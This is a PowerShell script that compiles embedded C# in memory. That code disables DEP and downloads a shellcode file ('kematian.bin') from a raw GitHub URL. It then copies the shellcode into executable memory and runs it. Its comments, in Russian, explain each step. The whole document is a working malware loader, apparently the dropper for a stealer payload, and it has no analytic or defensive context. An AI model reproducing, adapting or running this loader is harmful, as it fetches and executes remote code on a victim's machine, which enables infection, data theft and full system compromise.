function kematian {
    $kematianthegreat = @"
    using System;
    using System.Net;
    using System.Runtime.InteropServices;
    using System.Diagnostics;

    public class kematianthegreat {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr address, uint dwSize, uint allocType, uint mode);

        [DllImport("kernel32.dll")]
        static extern bool SetProcessDEPPolicy(uint dwFlags);

        [DllImport("kernel32.dll")]
        static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void MemLoader();

        public static void Main() {
            // 1. Отключаем DEP
            SetProcessDEPPolicy(0);

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            string url = "https://raw.githubusercontent.com/sdfsdsdsdfsfdffs/testtt/main/kematian.bin";
            byte[] golangshc;
            using (WebClient client = new WebClient()) {
                golangshc = client.DownloadData(url);
            }

            // 2. Выделяем память с флагом EXECUTE_READWRITE
            IntPtr chainski = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(golangshc.Length), 0x1000, 0x40);

            // 3. Копируем шеллкод
            Marshal.Copy(golangshc, 0x0, chainski, golangshc.Length);

            // 4. Очищаем кэш инструкций (чтобы процессор "увидел" новый код)
            FlushInstructionCache(Process.GetCurrentProcess().Handle, chainski, (UIntPtr)golangshc.Length);

            // 5. Запускаем
            MemLoader kdot = Marshal.GetDelegateForFunctionPointer<MemLoader>(chainski);
            kdot();
        }
    }
"@
    Add-Type $kematianthegreat
    [kematianthegreat]::Main()
}
kematian
